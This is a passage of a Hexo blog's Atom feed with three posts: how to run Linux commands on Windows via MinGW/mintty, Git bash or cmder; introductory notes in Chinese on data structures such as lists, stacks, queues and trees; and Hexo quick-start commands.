        2. 解压，并copy mintty.exe文件到C:\MSYS\bin中
        3. 打开编辑msys.bat文件，在适当位置添加:

            <span class="comment"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">set</span> MSYSCON=mintty.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure></span>
</code></pre><h3 id="2-_使用Git_bash">2. 使用Git bash</h3><pre><code>安装了git，就可以直接只用git-bash，git-bash也是基于M<span class="keyword">in</span>GW实现的。
</code></pre><h3 id="3-_使用cmder">3. 使用cmder</h3><pre><code>1. 下载以及安装教程：<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"https://github.com/cmderdev/cmder"</span>&gt;</span>安装<span class="tag">&lt;/<span class="title">a</span>&gt;</span>
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="在windows中使用LInux的命令。可以通过如下方法实现">在windows中使用LInux的命令。可以通过如下方法实现</h2><h3 id="1-_使用MinGW以及其中的Linux命令套件">1. 使用MinGW以及其中的Linux命令套件</h3><p]]>
    </summary>
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[数据结构-基本结构]]></title>
    <link href="http://yoursite.com/2015/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-1/"/>
    <id>http://yoursite.com/2015/10/04/数据结构-1/</id>
    <published>2015-10-03T16:00:00.000Z</published>
    <updated>2015-10-05T06:44:57.746Z</updated>
    <content type="html"><![CDATA[<h2 id="定义">定义</h2><pre><code>数据结构是相互之间存在一种或多种特定关系的数据元素的集合
</code></pre><h2 id="分类">分类</h2><pre><code><span class="number">1.</span> 逻辑结构
    集合结构， 线性结构， 树形结构， 图形结构
<span class="number">2.</span> 物理结构
    顺序存储结构(如：数组)， 链接存储结构
</code></pre><h2 id="线性表[List]">线性表[List]</h2><pre><code><span class="number">1.</span>定义：零个或多个数据元素的有限序列， 数学定义(a1,a2....an)
<span class="number">2.</span> 特点：
    <span class="number">1.</span> 线性表是有限的
    <span class="number">2.</span> 线性表的元素个数n(n&gt;=<span class="number">0</span>)定义为线性表的长度， 当n=<span class="number">0</span>时， 成为空表
    <span class="number">3.</span> 每个数据元素都有一个确定的位置
    <span class="number">4.</span> 除第一个元素， 每个元素都有且只有一个前继元素
    <span class="number">5.</span> 除最后一个元素，每个元素都有且只有一个后继元素
<span class="number">3.</span> 在计算机中的存储方式
    <span class="number">1.</span> 顺序存储(ArrayList)--查询快， 插入/删除慢
    <span class="number">2.</span> 链接存储(LinkList)--插入/删除快， 查询慢
</code></pre><h2 id="栈">栈</h2><pre><code><span class="number">1.</span> 定义: 栈是限定仅在表尾进行插入和删除操作的线性表
    允许插入和删除操作的一端叫做栈顶(top)，另一端叫做栈底(bottom)
<span class="number">2.</span> 特点：后进先出[<span class="keyword">Last</span> <span class="keyword">In</span> <span class="keyword">First</span> <span class="keyword">Out</span>]
</code></pre><h2 id="队列">队列</h2><pre><code><span class="number">1.</span> 定义: 队列是只允许在一段进行插入操作，在另一端进行删除操作的线性表
<span class="number">2.</span> 特点：先进先出[<span class="keyword">First</span> <span class="keyword">In</span> <span class="keyword">First</span> <span class="keyword">Out</span>]
</code></pre><h2 id="树">树</h2><pre><code><span class="number">1.</span> 定义： 树是n(n&gt;=<span class="number">0</span>)个节点的有限集。n=<span class="number">0</span>时称为空树。
<span class="number">2.</span> 特点： 前提-任意一颗非空树
    <span class="number">1.</span> 有且仅有一个特定的根节点(Root)
    <span class="number">2.</span> 当n&gt;<span class="number">1</span>时， 其余节点可分为m(m&gt;<span class="number">0</span>)个互不相交的有限集(T1,T2...Tn),其中每个集合本身又是一颗树，且称为根的子树
                图一
    <span class="number">3.</span> 结点分类: 树的结点包含一个数据元素及若干个指向起子树的分支
        <span class="number">1.</span> 结点拥有的子树数目称为结点的度(Degree)
        <span class="number">2.</span> 度为<span class="number">0</span>的结点称为叶(子)结点(Leaf)或者终端结点
        <span class="number">3.</span> 度不为<span class="number">0</span>的结点称为分支结点或者非终端节点
        <span class="number">4.</span> 除根结点之外，分支结点也称为内部结点
        <span class="number">5.</span> 树的度是树内各结点的度的最大值
        <span class="number">6.</span> 结点的子树的根称为该结点的孩子结点(Child),该结点称为孩子的双亲
        <span class="number">7.</span> 同一个双亲的孩子之间互称为兄弟(Sibling)
        <span class="number">8.</span> 结点的祖先是从根到该结点所经分支上的所有结点
        <span class="number">9.</span> 结点的层次(Level)从根开始定义起， 根在第一层，根的孩子为第二层。树的结点的最大层次数称为树的深度(Depth)或高度
        <span class="number">10.</span> 如果将树种结点的各子树看成从左至右室友次序，且不能互换的，则称为有序树，反之则称为无序树
        <span class="number">11.</span> 深林是m(m&gt;=<span class="number">0</span>)棵互不相交的树的集合
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="定义">定义</h2><pre><code>数据结构是相互之间存在一种或多种特定关系的数据元素的集合
</code></pre><h2 id="分类">分类</h2><pre><code><span class="number">1.</span> 逻辑结构
  ]]>
    </summary>
    
      <category term="ADT" scheme="http://yoursite.com/tags/ADT/"/>
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Add a new Blog]]></title>
    <link href="http://yoursite.com/2015/10/03/new-a-blog/"/>
    <id>http://yoursite.com/2015/10/03/new-a-blog/</id>
    <published>2015-10-02T16:00:00.000Z</published>
    <updated>2015-10-06T09:50:48.014Z</updated>
    <content type="html"><![CDATA[<p>The blog system is build by <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! you can get document from <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick_Start">Quick Start</h2><h3 id="step_into_hexo_project_root_directory">step into hexo project root directory</h3><pre><code>如： D:<span class="command">\Dev</span>_Env<span class="command">\Project</span><span class="command">\GitProject</span><span class="command">\hexo</span>
</code></pre><h3 id="Create_a_new_post(a_new_blog)">Create a new post(a new blog)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run_server_to_check">Run server to check</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate_static_files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy_to_remote_sites,_in_this_will_automatic_deploy_to_github-">Deploy to remote sites, in this will automatic deploy to github.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>The blog system is build by <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! you can get document from <a href="http://]]>
    </summary>
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
      <category term="Hexo Blog" scheme="http://yoursite.com/categories/Hexo-Blog/"/>
    
  </entry>
  
</feed>
